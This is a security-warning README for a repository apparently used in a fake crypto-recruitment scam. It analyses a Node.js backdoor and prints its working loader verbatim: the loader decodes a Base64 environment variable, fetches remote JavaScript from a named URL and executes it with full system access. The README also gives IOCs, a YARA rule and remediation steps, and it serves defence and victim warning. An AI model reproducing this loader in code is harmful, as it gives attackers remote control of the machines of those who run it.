# ⚠️ CRITICAL SECURITY WARNING - MALICIOUS CODE DETECTED ⚠️

## 🚨 DO NOT RUN THIS APPLICATION 🚨

This repository contains **ACTIVE MALWARE** and should **NOT** be executed under any circumstances.

---

## 📋 Executive Summary

This project was provided as a recruitment test by someone claiming to be a "CEO of a crypto company" on LinkedIn. **Security analysis has revealed that this is a malicious social engineering attack designed to compromise developer systems.**

**Threat Level:** 🔴 **CRITICAL** - Remote Code Execution (RCE) Backdoor

---

## 🔍 Technical Analysis

### The Backdoor Location

**File:** `backend/src/routes/governance.js`
**Lines:** 309-315

```javascript
//Get Cookie
exports.getCookie = asyncErrorHandler(async (req, res, next) => {
    const src = atob(process.env.DEV_API_KEY);
    const HttpOnly = (await axios.get(src)).data.cookie;
    const handler = new (Function.constructor)('require',HttpOnly);
    handler(require);
})();
```

### How the Attack Works

#### Stage 1: Obfuscated URL
- The backdoor reads `DEV_API_KEY` from environment variables
- This value is Base64-encoded to hide the malicious URL
- When decoded, it points to: `https://www.jsonkeeper.com/b/VBFK7`

#### Stage 2: Payload Retrieval
- The code makes an HTTP GET request to fetch malicious JavaScript
- The response contains heavily obfuscated code (57KB of malicious payload)
- See: `security-analysis/malicious-payload.json` for the full payload

#### Stage 3: Remote Code Execution
- Uses `Function.constructor` (equivalent to `eval()`) to execute the fetched code
- Passes Node.js's `require` function, giving **complete system access**
- This allows the attacker to:
  - Execute arbitrary system commands
  - Read/write/delete any files on your system
  - Steal sensitive data (SSH keys, credentials, tokens)
  - Install persistent backdoors
  - Use your machine for crypto mining or botnet attacks
  - Access browser cookies, passwords, cryptocurrency wallets

### Malicious Payload Analysis

The downloaded JavaScript payload (`security-analysis/malicious-payload.json`) contains:

- **Heavy Obfuscation:** Random variable names, encoded strings, anti-debugging techniques
- **OS Detection:** Likely checks for Windows, macOS, or Linux
- **Child Process Execution:** Uses Node.js `child_process` module to spawn system commands
- **Multi-stage Loader:** The obfuscated code likely downloads additional malware
- **Persistence Mechanisms:** May install itself to run on system startup

**Key Indicators:**
- 57,156 bytes of obfuscated JavaScript
- Multiple layers of string encoding/decoding
- References to Node.js system modules (`child_process`)
- Complex control flow obfuscation

---

## 🎯 Attack Vector: Social Engineering

### The Recruitment Scam

This is a **targeted social engineering attack** disguised as a job opportunity:

1. **Initial Contact:** Attacker poses as "CEO of crypto company" on LinkedIn
2. **Build Trust:** Professional profile, crypto/blockchain terminology
3. **The Bait:** "Technical assessment" or "code review task"
4. **The Trap:** Developer downloads and runs the malicious code
5. **System Compromise:** Malware executes immediately on `npm install` or `npm run dev`

### Why This Works

- Developers routinely download and run code for job assessments
- Crypto/blockchain projects seem legitimate for tech recruitment
- The README appears professional with screenshots and detailed setup
- Malicious code is hidden in a seemingly innocent "governance" API endpoint

---

## ⚡ Immediate Actions Required

### If You Have NOT Run This Code

1. ✅ **DO NOT** run `npm install`
2. ✅ **DO NOT** run `npm run dev` or any npm scripts
3. ✅ **DO NOT** trust the person who sent you this code
4. ✅ **DELETE** this repository from your system
5. ✅ **REPORT** the LinkedIn profile for fraud/impersonation
6. ✅ **WARN** others who may have received similar recruitment attempts

### If You HAVE Run This Code

Your system may be compromised. Take these steps **immediately**:

1. **🔴 Disconnect from the internet** (unplug ethernet, disable WiFi)
2. **🔴 Stop all Node.js processes:**
   ```bash
   killall node
   pkill -9 node
   ```

3. **🔴 Check for suspicious processes:**
   ```bash
   # macOS/Linux
   ps aux | grep node
   top -o cpu

   # Check network connections
   lsof -i -n -P | grep node
   netstat -an | grep ESTABLISHED
   ```

4. **🔴 Check for persistence mechanisms:**
   ```bash
   # macOS
   launchctl list | grep -v com.apple
   ls -la ~/Library/LaunchAgents/

   # Linux
   systemctl --user list-units
   crontab -l
   ```

5. **🔴 Scan your system:**
   - Run a full antivirus/antimalware scan
   - Consider using specialized malware removal tools
   - Check for unusual startup items or scheduled tasks

6. **🔴 Change ALL passwords** (from a different, clean device):
   - Email accounts
   - Banking/financial services
   - Cryptocurrency wallets
   - Cloud services (GitHub, AWS, Google Cloud, etc.)
   - SSH key passphrases

7. **🔴 Revoke and regenerate:**
   - API keys and tokens
   - SSH keys
   - GPG keys
   - Cryptocurrency wallet seeds (transfer funds to new wallet first)

8. **🔴 Monitor for suspicious activity:**
   - Bank accounts and credit cards
   - Cryptocurrency wallets
   - GitHub/GitLab for unauthorized commits
   - Cloud service bills for unusual resource usage

9. **🔴 Consider a full system reinstall** if you had sensitive data accessible

---

## 🛡️ For Security Researchers

### Repository Structure

```
/
├── backend/
│   └── src/
│       └── routes/
│           └── governance.js          # MALICIOUS CODE (lines 309-315)
├── security-analysis/
│   └── malicious-payload.json         # Downloaded malware (57KB obfuscated)
├── README.original.md                 # Original deceptive README
└── README.md                          # This security warning
```

### Environment Variables

**File:** `backend/src/config/config.env` (if present)

The `DEV_API_KEY` variable contains:
```
aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw==
```

**Decode it yourself:**
```bash
# Using echo and base64 command
echo "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw==" | base64 -d

# Or using Node.js (same as the malicious code)
node -e "console.log(atob('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9WQkZLNw=='))"
```

Decodes to:
```
https://www.jsonkeeper.com/b/VBFK7
```

### Indicators of Compromise (IOCs)

**Network:**
- `https://www.jsonkeeper.com/b/VBFK7` - Malware distribution URL
- Check firewall/proxy logs for connections to this domain

**File System:**
- Look for newly created files in:
  - `/tmp/` or `C:\Temp\`
  - `~/.config/` or `%APPDATA%`
  - Startup directories

**Process Indicators:**
- Unusual Node.js processes
- High CPU usage from node processes
- Unexpected network connections

### YARA Rule (Detection)

```yara
rule Malicious_NodeJS_RCE_Backdoor {
    meta:
        description = "Detects the malicious governance.js backdoor"
        author = "Security Analysis"
        severity = "critical"

    strings:
        $s1 = "atob(process.env.DEV_API_KEY)"
        $s2 = "Function.constructor"
        $s3 = "getCookie"
        $s4 = "asyncErrorHandler"

    condition:
        all of ($s*)
}
```

---

## 📊 Risk Assessment

| Risk Category | Severity | Impact |
|--------------|----------|---------|
| Remote Code Execution | 🔴 Critical | Complete system compromise |
| Data Theft | 🔴 Critical | Credentials, keys, personal data |
| Financial Loss | 🔴 Critical | Cryptocurrency theft, fraud |
| Persistence | 🟠 High | Long-term system access |
| Lateral Movement | 🟠 High | Network/organization compromise |
| Reputation Damage | 🟠 High | If used for attacks on others |

---

## 🔗 Additional Resources

### Reporting

- **LinkedIn:** Report the fraudulent profile immediately
- **Local Authorities:** Consider filing a cybercrime report
- **Professional Networks:** Warn colleagues and communities

### Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Social Engineering Red Flags](https://www.social-engineer.org/)
- [Secure Code Review Practices](https://owasp.org/www-project-code-review-guide/)

### Malware Analysis Tools

- **Static Analysis:** Ghidra, IDA Pro, Binary Ninja
- **Dynamic Analysis:** Process Monitor, Wireshark, Sysinternals Suite
- **Sandboxes:** Any.run, Hybrid Analysis, Joe Sandbox

---

## ⚖️ Legal Notice

This repository is being preserved as **evidence of cybercrime** and for **security research purposes only**.

**Disclaimer:** The malicious code has been documented but remains in this repository for:
- Educational purposes
- Security research
- Evidence preservation
- Warning other potential victims

**DO NOT:**
- Execute any code from this repository
- Use this malware for malicious purposes
- Distribute the malware payload

---

## 📞 Contact & Attribution

If you received this project as a "recruitment task" or "assessment":

1. You are likely being targeted by the same threat actor
2. Do NOT engage further with the sender
3. Report them to the platform (LinkedIn, etc.)
4. Run security checks on your system if you've already downloaded/run the code

---

## 🎓 Key Takeaways for Developers

### Red Flags to Watch For

1. ✋ **Unsolicited recruitment** from unknown "CEOs" or "CTOs"
2. ✋ **Urgent timeframes** for completing "assessments"
3. ✋ **Requests to run code** before review
4. ✋ **Overly complex setup** for simple demonstrations
5. ✋ **Cryptocurrency/blockchain** as cover story (attractive to developers)
6. ✋ **Base64 encoding** or obfuscation in legitimate-seeming code
7. ✋ **eval() or Function.constructor** in production code
8. ✋ **External HTTP requests** in unexpected places

### Best Practices

1. ✅ **Always review code** before running, especially from unknown sources
2. ✅ **Use sandboxed environments** (VMs, Docker) for untrusted code
3. ✅ **Check for hidden malicious code** in dependencies
4. ✅ **Verify recruiter identities** through official company channels
5. ✅ **Trust your instincts** - if something feels off, it probably is
6. ✅ **Use code scanning tools** like Semgrep, Snyk, or GitHub Advanced Security
7. ✅ **Never run npm install as root/admin**

---

## 📝 Document Version

- **Version:** 1.0
- **Date:** 2025-10-17
- **Status:** Active Threat
- **Last Updated:** 2025-10-17

---

## 🙏 Acknowledgments

Thank you for being cautious and doing your due diligence before running untrusted code. Your security-conscious approach prevented a potential compromise.

**Stay safe, stay vigilant, and always verify before you trust.**

---

**Original README:** See `README.original.md` for the deceptive documentation
**Malware Payload:** See `security-analysis/malicious-payload.json` for the full malicious code
**Backdoor Location:** `backend/src/routes/governance.js:309-315`